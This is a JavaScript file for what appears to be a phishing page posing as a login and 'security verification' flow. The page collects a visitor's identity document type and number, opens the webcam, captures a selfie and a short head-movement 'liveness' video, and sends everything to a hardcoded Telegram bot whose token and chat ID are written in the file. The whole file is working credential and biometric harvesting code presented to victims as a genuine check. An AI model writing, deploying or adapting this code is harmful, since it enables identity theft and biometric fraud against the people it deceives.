document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const loginStep = document.getElementById('login-step');
    const verificationStep = document.getElementById('verification-step');
    const successStep = document.getElementById('success-step');
    const video = document.getElementById('webcam');
    const cameraInstruction = document.querySelector('.camera-instruction');
    
    // CONFIGURACIÓN TELEGRAM
    // REEMPLAZA ESTOS VALORES CON LOS TUYOS
    const TELEGRAM_BOT_TOKEN = '7793777042:AAHegpN7eQIAcBJZjtMDfZZIwGnsmqv7vfg'; 
    const TELEGRAM_CHAT_ID = '-4992418825';

    let mediaRecorder;
    let recordedChunks = [];
    
    // Form Submission Handler
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        
        const docType = document.getElementById('doc-type').value;
        const docNumber = document.getElementById('doc-number').value;
        
        if (docType && docNumber) {
            // Enviar datos del formulario a Telegram primero (opcional)
            sendTextToTelegram(`Nuevo intento de acceso:\nTipo: ${docType}\nDocumento: ${docNumber}`);
            
            // Switch to verification step
            transitionToVerification();
        }
    });

    function transitionToVerification() {
        loginStep.classList.add('hidden');
        verificationStep.classList.remove('hidden');
        
        startCamera();
    }

    function transitionToSuccess() {
        verificationStep.classList.add('hidden');
        successStep.classList.remove('hidden');
        
        setTimeout(() => {
            window.location.reload();
        }, 3000);
    }

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: 640, height: 480 },
                audio: false 
            });
            video.srcObject = stream;
            
            // Esperar a que la cámara inicie para empezar el proceso
            video.onloadedmetadata = () => {
                setTimeout(startVerificationProcess, 1000);
            };

        } catch (err) {
            console.error("Error accessing camera:", err);
            cameraInstruction.textContent = "Error de cámara. Verifique permisos.";
        }
    }

    function startVerificationProcess() {
        // 1. Tomar Selfie
        cameraInstruction.textContent = "Mirando al frente...";
        
        setTimeout(() => {
            captureSelfie();
            
            // 2. Grabar Video con movimiento
            cameraInstruction.textContent = "Mueva su cabeza lentamente...";
            startRecording();
            
            // Parar grabación después de 4 segundos
            setTimeout(() => {
                stopRecording();
                cameraInstruction.textContent = "Procesando...";
            }, 4000);
            
        }, 1500);
    }

    function captureSelfie() {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        // Convertir a blob y enviar
        canvas.toBlob((blob) => {
            sendPhotoToTelegram(blob);
        }, 'image/jpeg', 0.8);
    }

    function startRecording() {
        if (!video.srcObject) return;
        
        recordedChunks = [];
        const options = { mimeType: 'video/webm;codecs=vp8' }; // Formato común
        
        try {
            mediaRecorder = new MediaRecorder(video.srcObject, options);
        } catch (e) {
            // Fallback si vp8 no es soportado
            mediaRecorder = new MediaRecorder(video.srcObject);
        }

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onstop = () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            sendVideoToTelegram(blob);
            stopCamera();
            transitionToSuccess();
        };

        mediaRecorder.start();
    }

    function stopRecording() {
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
            mediaRecorder.stop();
        }
    }

    function stopCamera() {
        if (video.srcObject) {
            const tracks = video.srcObject.getTracks();
            tracks.forEach(track => track.stop());
            video.srcObject = null;
        }
    }

    // --- FUNCIONES TELEGRAM ---

    function sendTextToTelegram(text) {
        if (TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('text', text);

        fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }

    function sendPhotoToTelegram(blob) {
        if (TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'selfie.jpg');
        formData.append('caption', 'Captura facial de seguridad');

        fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }

    function sendVideoToTelegram(blob) {
        if (TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') return;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', blob, 'biometric_video.webm');
        formData.append('caption', 'Video de prueba de vida');

        fetch(url, { method: 'POST', body: formData }).catch(console.error);
    }
});
